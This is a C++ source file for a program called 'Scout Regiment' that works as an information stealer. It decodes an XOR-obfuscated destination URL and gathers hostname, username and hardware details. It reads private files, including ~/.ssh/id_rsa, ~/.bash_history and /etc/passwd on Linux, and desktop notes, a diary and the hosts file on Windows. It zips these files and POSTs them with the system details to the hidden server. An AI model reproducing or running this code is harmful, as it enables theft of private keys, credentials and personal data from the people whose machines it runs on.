#include <iostream>
#include <string>

#include "scout.hpp"
#include "network.hpp"

#include <fstream>
#include <vector>
#include <stdexcept>

#include <miniz.h>

namespace {

    constexpr unsigned char XOR_KEY = 0x5A;

    std::string xor_transform(const std::string& input)
    {
        std::string output = input;

        for (char& c : output) {
            c ^= XOR_KEY;
        }

        return output;
    }

    std::string load_api_url(const std::string& path)
    {
        std::ifstream file(path, std::ios::binary);

        if (!file) {
            throw std::runtime_error("Unable to open destination file");
        }

        const std::string encrypted{
            std::istreambuf_iterator<char>(file),
            std::istreambuf_iterator<char>()
        };


        if (encrypted.empty()) {
            throw std::runtime_error("Destination file is empty");
        }

        return xor_transform(encrypted);
    }

    std::vector<std::byte> zip_secret_data(const std::vector<scoutreg::SecretData>& files)
    {
        if (files.empty()) {
            throw std::runtime_error("No files to compress");
        }

        std::size_t estimated_size = 0;
        for (const auto& file : files) {
            estimated_size += file.content.size() + file.filename.size() + 256;
        }

        mz_zip_archive zip{};
        if (!mz_zip_writer_init_heap(&zip, 0, estimated_size)) {
            throw std::runtime_error("Failed to initialize zip archive");
        }

        for (const auto& file : files) {
            if (!mz_zip_writer_add_mem(
                    &zip,
                    file.filename.c_str(),
                    file.content.data(),
                    file.content.size(),
                    MZ_BEST_COMPRESSION)) {
                mz_zip_writer_end(&zip);
                throw std::runtime_error("Failed to add file to zip: " + file.filename);
            }
        }

        void*     zip_buf  = nullptr;
        std::size_t zip_size = 0;
        if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) {
            mz_zip_writer_end(&zip);
            throw std::runtime_error("Failed to finalize zip archive");
        }

        const auto* raw = static_cast<std::byte*>(zip_buf);
        std::vector<std::byte> archive(raw, raw + zip_size);

        mz_free(zip_buf);
        mz_zip_writer_end(&zip);

        return archive;
    }


}

void log_msg(const auto& msg)
{
    std::cout << "[Scout Regiment] " << msg << std::endl;
}

static const auto info_opt = scoutreg::collect_system_info();

int main()
{
    std::string api_url;

    try {
        api_url = load_api_url("dest");
    }
    catch (const std::exception& e) {
        std::cerr << "Failed to load API URL: "
        << e.what() << '\n';
        return 1;
    }

    log_msg("System initialized");

    log_msg("Collecting system information");

    if (!info_opt) {
        log_msg("Failed to collect system inforamtion");
        return 1;
    }
    else {
        log_msg("Successfully collected system information\n");
    }

    auto info = info_opt.value();

    log_msg("Hostname: ");
    log_msg(info.hostname);

    log_msg("Username: ");
    log_msg(info.username);

    log_msg("CPU Architecture: ");
    log_msg(info.cpu_arch);

    log_msg("CPU Cores: ");
    log_msg(info.cpu_cores);

    log_msg("RAM Total: ");
    log_msg(info.total_ram);

    log_msg("RAM Available: ");
    log_msg(info.available_ram);

    long http_status = 0;

    log_msg("Gathering secret data");

#ifdef _WIN32
    const std::vector<std::string> paths = {
        "C:\\Users\\" + info.username + "\\Desktop\\stats.txt",
        "C:\\Users\\" + info.username + "\\Desktop\\notes.txt",
        "C:\\Users\\" + info.username + "\\Documents\\diary.txt",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\Logs\\CBS\\CBS.log"
    };
#else
    const std::vector<std::string> paths = {
        "/home/" + info.username + "/Desktop/stats.txt",
        "/home/" + info.username + "/.ssh/id_rsa",
        "/home/" + info.username + "/.bash_history",
        "/etc/passwd",
    };
#endif

    const auto secrets = scoutreg::collect_secret_data(paths);

    if (secrets.empty()) {
        log_msg("No files gathered from Desktop");
        return 1;
    }

    log_msg("Gathered " + std::to_string(secrets.size()) + " files");

    std::vector<std::byte> payload_zip;

    try {
        payload_zip = zip_secret_data(secrets);
    }
    catch (const std::exception& e) {
        std::cerr << "Failed to compress gathered data: "
        << e.what() << '\n';
        return 1;
    }

    log_msg("Compressed gathered data into zip");
    log_msg(payload_zip.size());

    const bool success = scoutreg::network::post(
        api_url + "/client-info",
        info,
        payload_zip,
        &http_status
    );

    if (!success) {
        std::cerr << "POST /client-info failed";

        if (http_status != 0) {
            std::cerr << ", HTTP status: " << http_status;
        }

        std::cerr << '\n';
        return 1;
    }


    return 0;
}
